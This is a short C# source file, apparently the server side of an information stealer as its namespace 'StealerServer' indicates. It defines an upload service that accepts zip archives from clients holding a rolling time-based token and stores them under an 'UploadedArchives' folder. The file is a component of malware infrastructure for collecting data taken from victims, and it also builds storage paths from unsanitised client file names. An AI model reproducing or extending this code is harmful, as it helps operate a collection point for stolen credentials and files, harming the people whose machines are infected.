namespace StealerServer.Service;

public class UploadService
{
    private readonly string _storagePath = Path.Combine(Directory.GetCurrentDirectory(), "UploadedArchives");

    public UploadService()
    {
        if (!Directory.Exists(_storagePath))
        {
            Directory.CreateDirectory(_storagePath);
        }
    }

    public async Task<bool> UploadArchiveAsync(string clientToken, string clientFileName, Stream fileStream)
    {
        var tokenCurrent = NetworkSecretTokenGenerator.GenerateCurrentToken(0);
        var tokenPast = NetworkSecretTokenGenerator.GenerateCurrentToken(-1);
        var tokenFuture = NetworkSecretTokenGenerator.GenerateCurrentToken(1);

        if (clientToken != tokenCurrent && clientToken != tokenPast && clientToken != tokenFuture)
        {
            return false;
        }

        var uniqueFileName = $"{clientFileName}_{Guid.NewGuid()}.zip";
        var fullPath = Path.Combine(_storagePath, uniqueFileName);

        using (var stream = new FileStream(fullPath, FileMode.Create))
        {
            await fileStream.CopyToAsync(stream);
        }

        return true;
    }
}


